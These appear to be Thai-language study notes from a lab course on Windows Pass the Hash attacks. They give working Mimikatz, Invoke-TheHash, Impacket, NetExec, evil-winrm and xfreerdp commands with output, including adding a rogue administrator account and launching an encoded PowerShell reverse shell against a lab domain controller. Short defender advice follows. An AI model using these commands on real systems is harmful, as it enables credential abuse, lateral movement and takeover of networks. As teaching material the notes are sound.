# Pass the Hash (PtH) Attack

## 📖 ภาพรวม

**Pass the Hash (PtH)** เป็นเทคนิคการโจมตีที่ผู้โจมตีใช้ **password hash** แทนรหัสผ่านแบบ plaintext ในการยืนยันตัวตน โดยผู้โจมตีไม่จำเป็นต้องถอดรหัส hash เพื่อให้ได้รหัสผ่านจริง

### 🔑 หลักการทำงาน

PtH attacks ใช้ประโยชน์จาก authentication protocol เนื่องจาก **password hash จะคงที่ (static) ในทุก session จนกว่าจะเปลี่ยนรหัสผ่าน**

---

## 🎯 ข้อกำหนดเบื้องต้น

### สิทธิ์ที่ต้องการ:
- **Administrative privileges** หรือ
- **Particular privileges** บนเครื่องเป้าหมาย

### วิธีการได้ Hash มา:

| วิธีการ | รายละเอียด |
|---|---|
| **Dumping SAM Database** | ดึง local SAM database จากเครื่องที่ถูกโจมตีสำเร็จแล้ว |
| **Extracting from NTDS** | ดึง hashes จาก NTDS database (ntds.dit) บน Domain Controller |
| **Memory Extraction** | ดึง hashes จาก memory (lsass.exe) |

### ตัวอย่างข้อมูลที่ใช้:
```
Username: julio
Domain: inlanefreight.htb
NTLM Hash: 64F12CDDAA88057E06A81B54E73B949B
```

---

## 🔐 Windows NTLM คืออะไร?

### คำนิยาม:

**NTLM (New Technology LAN Manager)** คือชุด security protocols ของ Microsoft ที่:
- ยืนยันตัวตนผู้ใช้
- ปกป้องความสมบูรณ์และความลับของข้อมูล
- เป็น Single Sign-On (SSO) solution
- ใช้ challenge-response protocol

### ⚠️ จุดอ่อนของ NTLM:

**ปัญหาหลัก:** รหัสผ่านที่เก็บบน server และ domain controller **ไม่มีการ salt**

**ความหมาย:**
- ผู้โจมตีที่มี password hash สามารถยืนยันตัวตนได้โดยไม่ต้องรู้รหัสผ่านจริง
- นี่คือ **Pass the Hash Attack**

### 📊 สถานะปัจจุบัน:

| ด้าน | รายละเอียด |
|---|---|
| **Default Protocol** | Kerberos (ตั้งแต่ Windows 2000) |
| **NTLM Usage** | ยังใช้เพื่อความเข้ากันได้กับ legacy systems |
| **Microsoft Stance** | ยังคง support แต่แนะนำให้ใช้ Kerberos |

---

## 🛠️ เครื่องมือสำหรับ Pass the Hash (Windows)

### 1. Mimikatz

#### โมดูลที่ใช้: `sekurlsa::pth`

#### Parameters ที่ต้องการ:

| Parameter | คำอธิบาย |
|---|---|
| `/user` | Username ที่ต้องการปลอมแปลง |
| `/rc4` หรือ `/NTLM` | NTLM hash ของรหัสผ่าน |
| `/domain` | Domain ของ user (ใช้ `.` สำหรับ local account) |
| `/run` | โปรแกรมที่ต้องการรัน (default: cmd.exe) |

#### การใช้งาน:

```cmd
c:\tools> mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
```

#### ผลลัพธ์:

```
user    : julio
domain  : inlanefreight.htb
program : cmd.exe
impers. : no
NTLM    : 64F12CDDAA88057E06A81B54E73B949B
  |  PID  8404
  |  TID  4268
  |  LSA Process was already R/W
  |  LUID 0 ; 5218172 (00000000:004f9f7c)
  \_ msv1_0   - data copy @ 0000028FC91AB510 : OK !
  \_ kerberos - data copy @ 0000028FC964F288
   \_ des_cbc_md4       OK
   \_ *Password replace @ 0000028FC9673AE8 (32) -> null
```

**หลังจากนี้:** ใช้ `cmd.exe` เพื่อรันคำสั่งในบริบทของ user julio

**ตัวอย่าง:** เชื่อมต่อกับ shared folder ชื่อ "julio" บน DC

---

### 2. Invoke-TheHash (PowerShell)

#### คำอธิบาย:
- Collection ของ PowerShell functions
- รองรับ Pass the Hash ผ่าน **WMI** และ **SMB**
- ใช้ .NET TCPClient
- **ไม่ต้องการ local admin privileges** บน client
- แต่ user ที่ใช้ต้องมี **admin rights บนเครื่องเป้าหมาย**

#### Parameters ที่ต้องการ:

| Parameter | คำอธิบาย |
|---|---|
| `Target` | Hostname หรือ IP address |
| `Username` | Username สำหรับ authentication |
| `Domain` | Domain (ไม่จำเป็นสำหรับ local accounts) |
| `Hash` | NTLM hash (รองรับทั้ง LM:NTLM หรือ NTLM) |
| `Command` | คำสั่งที่ต้องการรัน |

---

#### A. Invoke-SMBExec (SMB Method)

**ตัวอย่าง:** สร้าง user ใหม่และเพิ่มเข้า Administrators group

```powershell
PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1

PS c:\tools\Invoke-TheHash> Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
```

**ผลลัพธ์:**
```
VERBOSE: [+] inlanefreight.htb\julio successfully authenticated on 172.16.1.10
VERBOSE: inlanefreight.htb\julio has Service Control Manager write privilege on 172.16.1.10
VERBOSE: Service EGDKNNLQVOLFHRQTQMAU created on 172.16.1.10
VERBOSE: [*] Trying to execute command on 172.16.1.10
[+] Command executed with service EGDKNNLQVOLFHRQTQMAU on 172.16.1.10
VERBOSE: Service EGDKNNLQVOLFHRQTQMAU deleted on 172.16.1.10
```

---

#### B. Reverse Shell ด้วย Invoke-WMIExec

**ขั้นตอนที่ 1:** ตั้ง Netcat listener

```powershell
PS C:\tools> .\nc.exe -lvnp 8001

listening on [any] 8001 ...
```

**ขั้นตอนที่ 2:** สร้าง PowerShell reverse shell payload

- ไปที่ **revshells.com**
- ตั้งค่า: IP = 172.16.1.5, Port = 8001
- เลือก: **PowerShell #3 (Base64)**

**ขั้นตอนที่ 3:** รัน Invoke-WMIExec

```powershell
PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1

PS c:\tools\Invoke-TheHash> Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell -e [BASE64_PAYLOAD]"
```

**ผลลัพธ์:**
```
[+] Command executed with process id 520 on DC01
```

**ได้:** Reverse shell connection จาก DC01 (172.16.1.10)

---

## 🐧 เครื่องมือสำหรับ Pass the Hash (Linux)

### 1. Impacket

#### A. impacket-psexec

**การใช้งาน:**
```bash
impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
```

**ผลลัพธ์:**
```
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 10.129.201.126.....
[*] Found writable share ADMIN$
[*] Uploading file SLUBMRXK.exe
[*] Opening SVCManager on 10.129.201.126.....
[*] Creating service AdzX on 10.129.201.126.....
[*] Starting service AdzX.....
[!] Press help for extra shell commands

Microsoft Windows [Version 10.0.19044.1415]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

#### เครื่องมือ Impacket อื่นๆ:
- `impacket-wmiexec`
- `impacket-atexec`
- `impacket-smbexec`

---

### 2. NetExec (nxc)

#### คำอธิบาย:
- Post-exploitation tool สำหรับ Active Directory
- ใช้ automate การประเมิน security
- สามารถทดสอบ authentication กับหลาย hosts

#### A. Password Spraying

**การใช้งาน:**
```bash
netexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
```

**ผลลัพธ์:**
```
SMB  172.16.1.10  445  DC01  [*] Windows 10.0 Build 17763 x64 (name:DC01)
SMB  172.16.1.10  445  DC01  [-] .\Administrator:30B3783CE2ABF1AF70F77D0660CF3453 STATUS_LOGON_FAILURE 
SMB  172.16.1.5   445  MS01  [*] Windows 10.0 Build 19041 x64 (name:MS01)
SMB  172.16.1.5   445  MS01  [+] .\Administrator 30B3783CE2ABF1AF70F77D0660CF3453 (Pwn3d!)
```

**คำอธิบาย:**
- `(Pwn3d!)` = user เป็น local administrator บนเครื่องนั้น

#### B. Local Auth Method

**เพิ่ม parameter:**
```bash
netexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 --local-auth
```

**ประโยชน์:**
- ทดสอบ local administrator hash ข้าม multiple hosts
- ตรวจสอบ password reuse
- พบ gold images ที่ใช้ password เดียวกัน

#### C. Command Execution

**การใช้งาน:**
```bash
netexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami
```

**ผลลัพธ์:**
```
SMB  10.129.201.126  445  MS01  [*] Windows 10 Enterprise 10240 x64
SMB  10.129.201.126  445  MS01  [+] .\Administrator 30B3783CE2ABF1AF70F77D0660CF3453 (Pwn3d!)
SMB  10.129.201.126  445  MS01  [+] Executed command 
SMB  10.129.201.126  445  MS01  MS01\administrator
```

---

### 3. evil-winrm

#### คำอธิบาย:
- ใช้ PowerShell remoting
- ทางเลือกเมื่อ SMB ถูก block
- ใช้เมื่อไม่มี administrative rights

#### การใช้งาน:

**Local Account:**
```bash
evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
```

**Domain Account:**
```bash
evil-winrm -i 10.129.201.126 -u administrator@inlanefreight.htb -H 30B3783CE2ABF1AF70F77D0660CF3453
```

**ผลลัพธ์:**
```
Evil-WinRM shell v3.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

---

### 4. xfreerdp (RDP with PtH)

#### ⚠️ ข้อกำหนด:

**1. Enable Restricted Admin Mode:**

```cmd
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

**Registry Path:**
```
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa
Value: DisableRestrictedAdmin = 0
```

#### การใช้งาน:

```bash
xfreerdp /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
```

**ผลลัพธ์:** ได้ GUI access ผ่าน RDP

---

## 🛡️ UAC และ Pass the Hash

### UAC Limitations

**Registry Key:**
```
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy
```

| ค่า | ความหมาย |
|---|---|
| `0` | เฉพาะ built-in admin (RID-500) ทำ remote admin ได้ |
| `1` | local admins อื่นๆ ทำ remote admin ได้ด้วย |

### FilterAdministratorToken

**Registry Key:**
```
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken
```

| ค่า | ความหมาย |
|---|---|
| `0` (default) | RID-500 bypass UAC |
| `1` | RID-500 ถูก UAC protection (PtH จะไม่สำเร็จ) |

### ⚠️ ข้อสังเกต:

✅ **Domain accounts** ที่มี administrative rights ยังสามารถใช้ PtH ได้ปกติ

❌ **Local accounts** จะถูกจำกัดโดย UAC settings

---

## 📋 สรุปเครื่องมือและ Use Cases

| เครื่องมือ | Platform | Protocol | Use Case | ต้องการ Admin? |
|---|---|---|---|---|
| **Mimikatz** | Windows | - | Start process with hash | ใช่ |
| **Invoke-TheHash** | Windows | SMB/WMI | Remote command execution | ไม่ (แต่ต้องมี admin บน target) |
| **impacket-psexec** | Linux | SMB | Command execution | ใช่ (บน target) |
| **NetExec** | Linux | SMB | Password spraying, enumeration | ใช่ (บน target) |
| **evil-winrm** | Linux | WinRM | PowerShell remoting | ใช่ (บน target) |
| **xfreerdp** | Linux | RDP | GUI access | ต้อง enable Restricted Admin |

---

## 💡 Best Practices และข้อแนะนำ

### สำหรับ Penetration Testers:

1. **เก็บ hashes ที่ได้มา** - อาจใช้ได้กับหลาย systems
2. **Test password reuse** - ใช้ NetExec scan subnet
3. **ระวัง account lockout** - อย่า spray passwords มากเกินไป
4. **Document findings** - บันทึก systems ที่ vulnerable

### สำหรับ Defenders:

1. **Implement LAPS** - Local Administrator Password Solution
2. **Enable UAC properly** - ตั้งค่า LocalAccountTokenFilterPolicy
3. **Monitor for PtH attacks** - ดู event logs สำหรับ logon type 3, 9, 10
4. **Use Kerberos** - disable NTLM ถ้าเป็นไปได้
5. **Unique local admin passwords** - อย่าใช้ password เดียวกันข้าม systems

---

## 🎯 Key Takeaways

### ทำไม PtH ถึงอันตราย:

1. **ไม่ต้องรู้รหัสผ่านจริง** - แค่มี hash ก็พอ
2. **Hash ไม่เปลี่ยน** - จนกว่าจะเปลี่ยนรหัสผ่าน
3. **Lateral Movement** - ใช้เคลื่อนที่ข้าม network ได้
4. **Multiple Tools** - มีเครื่องมือหลากหลายให้เลือกใช้

### ความแตกต่างจาก Kerberos:

- **NTLM:** ใช้ hash ได้โดยตรง (PtH)
- **Kerberos:** ต้อง crack hash หรือใช้ Pass the Ticket (PtT)

**ในบทถัดไป:** จะเรียนรู้การใช้ Kerberos protocol สำหรับ lateral movement!